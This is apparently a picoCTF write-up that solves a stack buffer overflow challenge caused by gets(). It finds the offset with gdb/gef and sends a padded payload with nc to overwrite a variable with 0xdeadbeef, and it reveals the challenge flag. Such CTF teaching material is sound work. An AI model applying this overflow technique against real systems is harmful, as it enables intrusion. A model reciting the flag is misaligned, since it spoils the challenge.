 ```python
if (code == GOAL) {
   printf("code == 0x%llx: how did that happen??\n", GOAL);
   puts("take a flag for your troubles");
   system("cat flag.txt");
```

In order to get flag, we must overwrite code and make it equal to goal.

We see that gets is used to input cluster, we see that max size of cluster is 256(0x100). So, we must give a string greater than 256 bytes to reach the variable code on the stack.

gets is vulnerable to buffer overflow

Debug with gdb, this is necessary to find where code variable is and override its value. disassemble main

 ```bash
0x000000000040074c <+133>:	call   0x4005d0 <gets@plt>
0x0000000000400751 <+138>:	mov    eax,0xdeadbeef
0x0000000000400756 <+143>:	cmp    QWORD PTR [rbp-0x8],rax
0x000000000040075a <+147>:	jne    0x40078c <main+197>
```

We see that code is stored at rbp-0x8, to reach code, we need to find the offset to reach the register rbp using a pattern string

```bash
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
[+] Saved as '$_gef0'
```

Use this pattern string as input and run the code

```bash
gef➤  pattern offset $rbp
[+] Searching for '6a61616161616162'/'626161616161616a' with period=8
[+] Found at offset 272 (little-endian search) likely
```

We find rbp at offset at 272.
To find position of code, we need to do rbp-8, so that is 272-8=264
We need to generate a string which is 264 bytes long and then enter a line in python to override the value of code
```bash
$ (python -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
```

run  this to get flag
```bash
$ (python -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

**FLAG - `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`**
